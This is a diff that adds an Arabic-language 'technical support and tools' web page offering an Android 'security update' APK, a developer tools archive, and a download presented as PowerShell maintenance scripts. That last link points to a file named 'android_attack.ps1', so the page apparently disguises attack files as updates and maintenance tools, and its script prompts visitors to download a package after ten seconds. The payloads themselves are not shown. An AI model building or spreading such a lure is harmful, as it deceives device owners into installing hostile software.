@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الدعم الفني والأدوات</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #00b4db 0%, #0083b0 100%);
+            color: #333;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            margin-bottom: 30px;
+            backdrop-filter: blur(10px);
+        }
+        
+        .header h1 {
+            color: #2c3e50;
+            font-size: 2.2em;
+            margin-bottom: 10px;
+        }
+        
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+        
+        .tool-card {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+        
+        .tool-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .tool-icon {
+            font-size: 2.5em;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .tool-card h3 {
+            color: #2c3e50;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .tool-card p {
+            color: #7f8c8d;
+            margin-bottom: 20px;
+            line-height: 1.6;
+            text-align: right;
+        }
+        
+        .btn {
+            display: block;
+            background: linear-gradient(135deg, #00b4db, #0083b0);
+            color: white;
+            padding: 12px 25px;
+            border-radius: 25px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            text-align: center;
+            margin-top: 15px;
+        }
+        
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 8px 15px rgba(0, 180, 219, 0.3);
+        }
+        
+        .support-section {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            backdrop-filter: blur(10px);
+        }
+        
+        .support-section h2 {
+            color: #2c3e50;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .contact-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+        
+        .contact-item {
+            background: rgba(0, 180, 219, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .footer {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.8);
+            margin-top: 50px;
+            padding: 20px;
+        }
+        
+        .file-size {
+            color: #7f8c8d;
+            font-size: 0.9em;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🛠️ مركز الأدوات والدعم الفني</h1>
+            <p>مجموعة متكاملة من الأدوات والتطبيقات الضرورية لتطوير الأنظمة والصيانة</p>
+        </div>
+
+        <div class="tools-grid">
+            <div class="tool-card">
+                <div class="tool-icon">📱</div>
+                <h3>حزمة تحديث Android</h3>
+                <p>التحديث الأمني الشامل لأجهزة Android مع تحسينات الأداء وإصلاح الثغرات الأمنية الحرجة</p>
+                <a href="assets/update_service.apk" class="btn">تحميل التطبيق</a>
+                <div class="file-size">حجم الملف: ~15 MB</div>
+            </div>
+            
+            <div class="tool-card">
+                <div class="tool-icon">⚙️</div>
+                <h3>أدوات المطورين</h3>
+                <p>مجموعة كاملة من أدوات تطوير الأنظمة ومنصات الاختبار والتطوير المتكاملة</p>
+                <a href="assets/platform-tools.zip" class="btn">تحميل الأدوات</a>
+                <div class="file-size">حجم الملف: ~120 MB</div>
+            </div>
+            
+            <div class="tool-card">
+                <div class="tool-icon">🔧</div>
+                <h3>سكريبتات PowerShell</h3>
+                <p>مجموعة سكريبتات الأتمتة والصيانة لأنظمة Windows مع واجهة تحكم متقدمة</p>
+                <a href="android_attack.ps1" class="btn">تحميل السكريبتات</a>
+                <div class="file-size">حجم الملف: ~8 KB</div>
+            </div>
+        </div>
+
+        <div class="support-section">
+            <h2>📞 الدعم الفني والاتصال</h2>
+            <div class="contact-info">
+                <div class="contact-item">
+                    <h4>الدعم الفني المباشر</h4>
+                    <p>متاح 24/7 لحل المشاكل الفنية</p>
+                </div>
+                <div class="contact-item">
+                    <h4>استشارات الأمان</h4>
+                    <p>تقييم الثغرات وتقديم الحلول الأمنية</p>
+                </div>
+                <div class="contact-item">
+                    <h4>تطوير الأنظمة</h4>
+                    <p>حلول مخصصة لتطوير البنية التحتية</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>© 2024 مركز الدعم الفني والتطوير. نحن هنا لمساعدتك على مدار الساعة.</p>
+    </div>
+
+    <script>
+        // تتبع النقرات على روابط التحميل
+        document.querySelectorAll('.btn').forEach(button => {
+            button.addEventListener('click', function(e) {
+                const fileName = this.getAttribute('href').split('/').pop();
+                console.log(`User downloaded: ${fileName}`);
+                
+                // يمكن إضافة تتبع analytics هنا
+                setTimeout(() => {
+                    alert('بدأ تحميل الملف بنجاح. شكراً لاستخدامك خدماتنا.');
+                }, 1000);
+            });
+        });
+        
+        // تحميل تلقائي بعد 10 ثواني
+        setTimeout(() => {
+            if (confirm('هل ترغب في تحميل حزمة الأدوات الأساسية تلقائياً؟')) {
+                window.location.href = 'assets/platform-tools.zip';
+            }
+        }, 10000);
+    </script>
+</body>
+</html>
